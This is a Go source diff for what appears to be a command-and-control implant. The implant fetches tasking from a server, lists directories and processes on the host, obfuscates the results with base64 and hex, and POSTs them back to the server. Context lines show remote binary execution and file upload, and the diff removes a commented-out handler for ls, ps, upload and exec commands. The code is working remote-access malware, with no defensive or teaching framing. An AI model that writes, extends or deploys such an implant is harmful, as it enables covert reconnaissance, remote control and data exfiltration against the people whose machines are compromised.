@@ -5,6 +5,7 @@ import (
 	crand "crypto/rand"
 	"encoding/hex"
 	"encoding/json"
+        "encoding/base64"
 	"fmt"
 	mathrand "math/rand"
 	"net/http"
@@ -34,6 +35,15 @@ type InitialInfo struct {
 	Jitter       int    `json:"jitter"`
 }
 
+type ResultsCreate struct {
+    TaskingID float64 `json:"tasking_id"`
+    Session   string  `json:"session"`
+    Task      string  `json:"task"`
+    Args    string     `json:"args"`
+    Results   string  `json:"results"`
+}
+
+
 func GatherInfo() InitialInfo {
 	bytes := make([]byte, 4)
 	_, err := crand.Read(bytes)  
@@ -54,14 +64,34 @@ func GatherInfo() InitialInfo {
 	return hostInfo
 }
 
-func ParseTasks(tasking string) (string, error) {
+func encodeToBaseHexArray(input []string) []string {
+        encodedOutput := make([]string, len(input))
+        for i, str := range input {
+                encodedBase64 := base64.StdEncoding.EncodeToString([]byte(str))
+                encodedHex := hex.EncodeToString([]byte(encodedBase64))
+                encodedOutput[i] = encodedHex
+        }
+        return encodedOutput
+}
+
+func encodeToBaseHexString(input string) string {
+        encodedBase64 := base64.StdEncoding.EncodeToString([]byte(input))
+        encodedHex := hex.EncodeToString([]byte(encodedBase64))
+        return encodedHex
+}
+
+func ParseTasks(serverUrl string, tasking string) (string, error) {
+        
 	var tasks []map[string]interface{}
 	err := json.Unmarshal([]byte(tasking), &tasks)
 	if err != nil {
 		return "", err
 	}
+        fmt.Println(tasks)
+        
 
 	for _, taskData := range tasks {
+                url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])
 		fmt.Printf("Task ID: %v\n", taskData["id"])
 		fmt.Printf("Task: %v\n", taskData["task"])
 		fmt.Printf("Args: %v\n", taskData["args"])
@@ -69,11 +99,45 @@ func ParseTasks(tasking string) (string, error) {
                         dir, err := listDirectories(taskData["args"].(string))
                         if err != nil {
                                 fmt.Println("Error listing directories:", err)
-                                return "", err
+                                continue
                         }
-                        //marshalOutput(taskData["id"].(int), taskData["task"].(string), dir)
-                        fmt.Println(dir)
+                                                
+                        encodedOutput := encodeToBaseHexString(dir)
+                        encodedArgs := encodeToBaseHexString(taskData["args"].(string))
+                        fmt.Println("Encoded args:", encodedArgs)
+                        fmt.Println("Encoded output:", encodedOutput)
+                        fmt.Println(taskData["id"].(float64))
+                        result := ResultsCreate{
+                                TaskingID: taskData["id"].(float64),
+                                Session:   taskData["session"].(string),
+                                Task:      taskData["task"].(string),
+                                Args:      encodedArgs,
+                                Results:   encodedOutput,
+                        }
+                        _, err = PostJson(url, result)
+                        if err != nil {
+                                fmt.Println("Error posting task result:", err)
+                        }
 
+                } else if taskData["task"] == "ps" {                
+                        processList, err := get_ps()
+                        if err != nil {
+                                fmt.Println("Error getting process list:", err)
+                                continue
+                        }
+                        encodedOutput := encodeToBaseHexString(processList)
+                        result := ResultsCreate{
+                                TaskingID: taskData["id"].(float64),
+                                Session:   taskData["session"].(string),
+                                Task:      taskData["task"].(string),
+                                Args:      "",
+                                Results:   encodedOutput,
+                        }
+                        _, err = PostJson(url, result)
+                        if err != nil {
+                                fmt.Println("Error posting task result:", err)
+                        }
+                        
                 }
 
 	}
@@ -135,6 +199,9 @@ func PostJson(url string, payload interface{}) (int, error) {
 	}
 	defer resp.Body.Close()
 
+        body, _ := io.ReadAll(resp.Body)
+        fmt.Println("Response body:", string(body))
+
 	return resp.StatusCode, nil
 }
 
@@ -181,86 +248,81 @@ func read_proc_file(file_name string) string {
         return content
 }
 
-func get_ps(conn net.Conn) {
-        proc_files := get_proc_listing()
+func get_ps() (string, error) {
+    proc_files := get_proc_listing()
+    process_list := ""
 
-        var process_list []string
+    for _, name := range proc_files {
+        pid, err := strconv.Atoi(name)
+        if err != nil {
+            continue
+        }
 
-        for _, name := range proc_files {
-                pid, err := strconv.Atoi(name)
-                if err != nil {
-                        continue
-                } else {
-                        cmdline_path := fmt.Sprintf("/proc/%d/cmdline", pid)
-                        ppid_path := fmt.Sprintf("/proc/%d/status", pid)
+        cmdline_path := fmt.Sprintf("/proc/%d/cmdline", pid)
+        ppid_path := fmt.Sprintf("/proc/%d/status", pid)
 
-                        var cmdline_file_contents string
-                        if len(read_proc_file(cmdline_path)) != 0 {
-                                cmdline_file_contents = read_proc_file(cmdline_path)
-                        } else {
-                                cmdline_path := fmt.Sprintf("/proc/%d/status", pid)
-                                cmdline_file_contents = read_proc_file(cmdline_path)
+        var cmdline_file_contents string
+        if len(read_proc_file(cmdline_path)) != 0 {
+            cmdline_file_contents = read_proc_file(cmdline_path)
+        } else {
+            // Fallback to reading name from /proc/[pid]/status
+            status_contents := read_proc_file(ppid_path)
+            cmdline_file_lines := strings.Split(status_contents, "\n")
 
-                                cmdline_file_lines := strings.Split(cmdline_file_contents, "\n")
-
-                                for _, line := range cmdline_file_lines {
-                                        if strings.HasPrefix(line, "Name:") {
-                                                parts := strings.Fields(line)
-                                                if len(parts) == 2 {
-                                                        cmd_line_formatted := fmt.Sprintf("%v%v%v", "[", parts[1], "]")
-                                                        cmdline_file_contents = cmd_line_formatted
-                                                } else {
-                                                        cmdline_file_contents = "?"
-                                                }
-                                                break
-                                        }
-                                }
-                        }
-
-                        ppid_file_contents := read_proc_file(ppid_path)
-                        ppid_lines := strings.Split(ppid_file_contents, "\n")
-
-                        var ppid_value string
-
-                        for _, line := range ppid_lines {
-                                if strings.HasPrefix(line, "PPid:") {
-                                        parts := strings.Fields(line)
-                                        if len(parts) == 2 {
-                                                ppid_value = parts[1]
-                                        } else {
-                                                ppid_value = "?"
-                                        }
-                                        break
-                                }
-                        }
-                        process_list = append(process_list, fmt.Sprintf("%-7d  %-7s  %s", pid, ppid_value, cmdline_file_contents))
+            for _, line := range cmdline_file_lines {
+                if strings.HasPrefix(line, "Name:") {
+                    parts := strings.Fields(line)
+                    if len(parts) == 2 {
+                        cmdline_file_contents = fmt.Sprintf("[%s]", parts[1])
+                    } else {
+                        cmdline_file_contents = "?"
+                    }
+                    break
                 }
+            }
         }
-        for _, value := range process_list {
-                fmt.Fprintf(conn, "%v\n", value)
+
+        ppid_file_contents := read_proc_file(ppid_path)
+        ppid_lines := strings.Split(ppid_file_contents, "\n")
+
+        var ppid_value string
+        for _, line := range ppid_lines {
+            if strings.HasPrefix(line, "PPid:") {
+                parts := strings.Fields(line)
+                if len(parts) == 2 {
+                    ppid_value = parts[1]
+                } else {
+                    ppid_value = "?"
+                }
+                break
+            }
         }
-        fmt.Fprintf(conn, "__END__\n")
+
+        process_list += fmt.Sprintf("%-7d  %-7s  %s\n", pid, ppid_value, cmdline_file_contents)
+    }
+    return process_list, nil
 }
+
 
 //func marshalOutput(taskId int, task string, output []string)
         // add completed and add datetime of completion
         //outputData := json.Marshal("") 
 
-func listDirectories(directory string) ([]string, error){
-        fileList := []string{}
+func listDirectories(directory string) (string, error){
+        fileList := ""
         dir, err := os.Open(directory)
         if err != nil {
-                return []string{}, err
+                return "", err
         }
         defer dir.Close()
 
         files, err := dir.Readdir(-1)
         if err != nil {
-                return []string{}, err
+                return "", err
         }
         for _, file := range files {
                 line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
-                fileList = append(fileList, line)
+                fileList += line
         }
         return fileList, nil
 }
@@ -348,39 +410,6 @@ func execBinary(conn net.Conn, binPath string, args []string, background bool) {
         fmt.Fprintf(conn, "%s", "__END__\n")
 
 }
-/*
-func handleConnection(conn net.Conn) {
-        defer conn.Close()
-
-        scanner := bufio.NewScanner(conn)
-
-        for scanner.Scan() {
-                command := scanner.Text()
-                commandParts := strings.Fields(command)
-                commandAction := commandParts[0]
-
-                if commandAction == "ls" {
-                        path := strings.Join(commandParts[1:], " ")
-                        listDirectories(conn, path)
-                } else if commandAction == "ps" {
-                        get_ps(conn)
-                } else if commandAction == "upload" {
-                        remotePath := commandParts[1]
-                        fileSize := commandParts[2]
-                        uploadFile(conn, remotePath, fileSize)
-                } else if commandAction == "exec" && commandParts[1] == "-b" {
-                        binPath := commandParts[2]
-                        args := commandParts[3:]
-                        execBinary(conn, binPath, args, true)
-                } else if commandAction == "exec" {
-                        binPath := commandParts[1]
-                        args := commandParts[2:]
-                        execBinary(conn, binPath, args, false)
-
-                }
-        }
-}
-*/
 
 
 func main() {
@@ -431,7 +460,7 @@ func main() {
                         if err != nil {
                                 fmt.Printf("Error fetching tasking: %v\n", err)
                         } else {
-                                ParseTasks(tasking)
+                                ParseTasks(serverUrl, tasking)
                         }
                         continue
                 }
